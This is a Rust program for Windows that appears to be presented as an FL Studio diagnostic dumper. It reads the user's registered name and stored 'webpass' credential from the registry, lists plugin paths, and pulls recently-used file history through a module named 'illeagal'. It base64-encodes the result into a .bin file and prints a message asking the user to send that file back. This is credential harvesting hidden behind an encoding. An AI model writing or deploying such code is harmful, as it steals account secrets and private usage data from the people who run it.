mod dumper;
mod illeagal;

use std::io;
use std::fs;
use winreg::enums::*;
use winreg::RegKey;
use crate::dumper::{base64encode, dump};
use std::path::Path;

const FL_SHARED_PATHS: &str = "Software\\Image-Line\\Shared\\Paths";
const FL_SHARED_PLUGIN_SEARCH_PATHS_LIST: &str = "Software\\Image-Line\\Shared\\Plugin search paths\\List";
const FL_REGISTRATIONS: &str = "Software\\Image-Line\\Registrations";


fn main() {
    let mut dump_content = vec![];

    let reg_hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let reg_fl_shared_paths = reg_hkcu.create_subkey(FL_SHARED_PATHS).unwrap().0;
    let reg_fl_registrations = reg_hkcu.create_subkey(FL_REGISTRATIONS).unwrap().0;

    let fl_executable = format!("FL Studio Executable: {}", reg_fl_shared_paths.get_value::<String, &str>("FL Studio").unwrap());
    let fl_executable_original = reg_fl_shared_paths.get_value::<String, &str>("FL Studio").unwrap();
    let fl_engine = format!("FL Studio Engine: {}", reg_fl_shared_paths.get_value::<String, &str>("FL Studio engine").unwrap());
    let fl_username = format!("FL Studio Username: {}", reg_fl_registrations.get_value::<String, &str>("FL Studio user name").unwrap());
    let fl_webpass = format!("FL Studio Webpass: {}", reg_fl_registrations.get_value::<String, &str>("FL Studio webpass").unwrap());

    dump_content.push(fl_executable.to_owned());
    dump_content.push(fl_engine);
    dump_content.push(fl_username);
    dump_content.push(fl_webpass);

    let mut registrations_export_list = vec!["FL_REGISTRATIONS => ".to_owned()];
    for i in reg_hkcu.open_subkey(FL_REGISTRATIONS).unwrap().enum_keys() {
        match i {
            Ok(name) => {
                registrations_export_list.push(name);
            }
            Err(e) => {
                println!("读取子键名称时出错：{:?}", e);
            }
        }
    }
    dump_content.push(registrations_export_list.join("    (||)    "));


    let mut vst_export_file_str = String::from("FL_PLUGINS_STRINGS => \n");
    for i in reg_hkcu.open_subkey(FL_SHARED_PLUGIN_SEARCH_PATHS_LIST).unwrap().enum_keys() {
        match i {
            Ok(name) => {
                let expt = reg_hkcu.create_subkey(format!("Software\\Image-Line\\Shared\\Plugin search paths\\List\\{}", &name)).unwrap().0.get_value::<String, &str>("path").unwrap();

                // if !expt.to_lowercase().contains("%flpath%") {
                let fl_executable_program = fl_executable_original.split("\\").last().unwrap();

                let aexpt = expt.replace("%FLPath%\\", reg_fl_shared_paths.get_value::<String, &str>("FL Studio").unwrap().replace(fl_executable_program, "").as_str());

                let path = Path::new(&aexpt);

                if let Ok(entries) = fs::read_dir(path) {
                    for entry in entries {
                        let path = entry.unwrap().path();
                        if path.is_dir() {
                            if aexpt.to_lowercase().contains("fruity") {
                                let path_output = format!("   🥭📁 PATH  | {:<50}-(from)->       {}\n", path.file_name().unwrap().to_string_lossy(), path.display());
                                vst_export_file_str.push_str(&path_output);
                            } else {
                                let path_output = format!("     📁 PATH  | {:<50}-(from)->       {}\n", path.file_name().unwrap().to_string_lossy(), path.display());
                                vst_export_file_str.push_str(&path_output);
                            }
                        } else if path.is_file() {
                            let file_output = format!("     📄 FILE  | {:<50}-(from)->       {}\n", path.file_name().unwrap().to_string_lossy(), path.display());
                            vst_export_file_str.push_str(&file_output);
                        }
                    }
                } else {
                    let file_output = format!(" ⚠️⚠️⚠️ ERR_  | {:<50}\n", path.display());
                    vst_export_file_str.push_str(&file_output);
                }
            }
            Err(e) => {
                println!("读取子键名称时出错：{:?}", e);
            }
        }
    }
    dump_content.push(vst_export_file_str);

    dump_content.push(illeagal::leak_mru());

    let dumper_return = &dump(base64encode(dump_content.to_owned().join("\n\n")));
    if dumper_return != "data" {
        println!("请将本目录下的 {}.bin 文件发回来给我", dumper_return)
    }

    let _ = io::stdin().read_line(&mut String::new()).unwrap();
}